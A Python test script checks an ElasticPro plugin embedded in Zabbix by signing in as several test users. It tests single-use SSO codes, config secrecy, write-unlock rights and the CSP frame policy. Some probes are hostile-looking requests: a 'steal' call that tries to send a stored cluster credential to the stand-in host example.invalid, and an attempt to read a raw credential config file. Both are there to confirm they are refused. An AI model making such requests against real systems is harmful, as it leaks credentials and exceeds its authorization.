"""The whole chain, as each user: Zabbix sign-in -> module page -> frame code -> ElasticPro
session -> what that session can see and do. Passwords are read from the 0600 file and
never printed."""
import html, http.cookiejar, json, os, re, ssl, sys, urllib.error, urllib.parse, urllib.request

import _common

CTX = ssl._create_unverified_context()          # both are self-signed test certs, on loopback
ZBX = _common.zabbix_url()
EP = _common.ep_url()
creds = _common.read_accounts()
_flagvals = {_common.flag_value(f) for f in ("--zabbix-url", "--accounts", "--ep-url")}
only = [a for a in sys.argv[1:] if not a.startswith("--") and a not in _flagvals] or ["Admin", "ep-admin", "ep-user", "ep-unmapped"]


def opener():
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()),
                                       urllib.request.HTTPSHandler(context=CTX))


def bridge(msg, session=None):
    if session:
        msg = {**msg, "session": session}
    req = urllib.request.Request(EP + "/bridge", json.dumps(msg).encode(), {"Content-Type": "application/json"})
    return json.load(urllib.request.urlopen(req, context=CTX))


for user in only:
    o = opener()
    o.open(ZBX + "/index.php", urllib.parse.urlencode(
        {"name": user, "password": creds[user], "autologin": "1", "enter": "Sign in"}).encode()).read()
    page = o.open(ZBX + "/zabbix.php?action=elasticpro.indices").read().decode()
    menu = "ElasticPro" in page
    admin_items = "elasticpro.settings" in page   # Config: offered to Super admins only (Module.php)
    m = re.search(r'<iframe[^>]*src="([^"]+)"', page)
    err = re.search(r'class="ep-error"[^>]*>(.*?)</div>', page, re.S)
    print(f"== {user}")
    print(f"   zabbix menu entry: {menu}   admin items offered: {admin_items}")
    if not m:
        print("   NO FRAME:", re.sub("<[^>]+>", " ", err.group(1)).strip()[:300] if err else page[:300])
        continue
    src = html.unescape(m.group(1))
    q = urllib.parse.urlparse(src)
    params = urllib.parse.parse_qs(q.query)
    print(f"   frame -> {q.scheme}://{q.netloc}/?embed={params.get('embed')} zbx_theme={params.get('zbx_theme')} #{q.fragment}")
    ex = bridge({"type": "SSO_EXCHANGE", "code": params["sso_code"][0]})
    if not ex.get("ok"):
        print("   exchange refused:", ex.get("message"))
        continue
    s = ex["session"]
    print(f"   signed in as {ex['caller']['name']} role={ex['caller']['role']} scoped={ex['caller']['scoped']}")
    again = bridge({"type": "SSO_EXCHANGE", "code": params["sso_code"][0]})
    print(f"   same code again: {again.get('kind')}")
    ping = bridge({"type": "PING"}, s)
    print(f"   PING clusters: {ping.get('clusters')}  primed: {ping.get('primed')}  configHint visible: {ping.get('configHint') is not None}")
    view = bridge({"type": "CONFIG_VIEW"}, s)
    if view.get("ok"):
        v = json.loads(view["text"])
        leaked = [k for k in ("password", "apiKey", "authHeader", "credentials") if k in view["text"]]
        print(f"   CONFIG_VIEW clusters: {[c.get('name') for c in v.get('clusters', [])]}  secret keys present: {leaked or 'none'}")
    else:
        print(f"   CONFIG_VIEW: {view.get('kind')} {view.get('message', '')[:120]}")
    cfg = bridge({"type": "CONFIG_READ", "path": "/app/config/config_cluster.json"}, s)
    print(f"   CONFIG_READ (raw file with credentials): {'allowed' if cfg.get('ok') else cfg.get('kind')}")
    unlock = bridge({"type": "WRITE_UNLOCK", "on": False}, s)
    print(f"   may unlock writes: {'yes' if unlock.get('ok') else unlock.get('kind')}")
    # The id the core gives a cluster it synced from the Zabbix host "vm-1 cluster" (zbx-<host slug>).
    VM1 = "zbx-vm-1-cluster"
    for cid in [VM1]:
        r = bridge({"type": "ES", "clusterId": cid, "method": "GET", "path": "/_cluster/health"}, s)
        print(f"   ES {cid} /_cluster/health: {'ok ' + str(r.get('data', {}).get('status') if isinstance(r.get('data'), dict) else '') if r.get('ok') else (r.get('kind'), r.get('message', '')[:100])}")
    steal = bridge({"type": "ES", "clusterId": VM1, "url": "http://example.invalid:9200", "method": "GET", "path": "/"}, s)
    print(f"   vm-1 credential sent to another URL: {'SENT' if steal.get('ok') or steal.get('kind') not in ('forbidden',) else 'refused'}"
          + ("" if user != "Admin" else " (admin: diagnostics allowed)"))
    # 2.5: the fleet cache and its live-update stream, as this Zabbix session. Same clusters as
    # PING (one scope for both), a ticket, and the stream answering with `hello` first — the
    # frame opens exactly this, same-origin, against ElasticPro's nginx.
    fs = bridge({"type": "FLEET_STATE"}, s)
    if fs.get("ok"):
        same = sorted(fs.get("clusterIds") or []) == sorted(ping.get("clusters") or [])
        print(f"   FLEET_STATE running={fs.get('running')} clusterIds={fs.get('clusterIds')}  same as PING: {same}")
    else:
        print(f"   FLEET_STATE: {fs.get('kind')} {fs.get('message', '')[:120]}")
    t = bridge({"type": "EVENTS_TICKET"}, s)
    if not t.get("ok"):
        print(f"   EVENTS_TICKET: {t.get('kind')} {t.get('message', '')[:120]}")
    else:
        try:
            r = urllib.request.urlopen(urllib.request.Request(EP + t["path"], headers={"Accept": "text/event-stream"}),
                                       context=CTX, timeout=10)
            ctype = r.headers.get("Content-Type", "")
            first = b""
            while b"\n\n" not in first and len(first) < 4096:
                chunk = r.read1(1024) if hasattr(r, "read1") else r.read(1)
                if not chunk:
                    break
                first += chunk
            r.close()
            ev = re.search(rb"^event: *(\S+)", first, re.M)
            print(f"   /events: {r.status} {ctype}  first event: {ev.group(1).decode() if ev else first[:80]!r}")
        except Exception as e:  # a proxy that buffers shows up here as a timeout
            print(f"   /events: FAILED {e}")
        try:
            urllib.request.urlopen(EP + t["path"], context=CTX, timeout=5)
            print("   /events same ticket again: ACCEPTED (must be single-use)")
        except urllib.error.HTTPError as e:
            print(f"   /events same ticket again: {e.code} (single-use)")

# The frame is allowed only inside Zabbix: ElasticPro's CSP must name this Zabbix origin.
csp = urllib.request.urlopen(EP + "/", context=CTX).headers.get("Content-Security-Policy", "")
fa = re.search(r"frame-ancestors([^;]*)", csp)
# The browser loads Zabbix at its public address, not the loopback one this script uses.
zorigin = f"https://{q.hostname}:{urllib.parse.urlparse(ZBX).port}"
print(f"== frame-ancestors:{fa.group(1) if fa else ' (none)'}  names {zorigin}: {bool(fa and zorigin in fa.group(1))}")
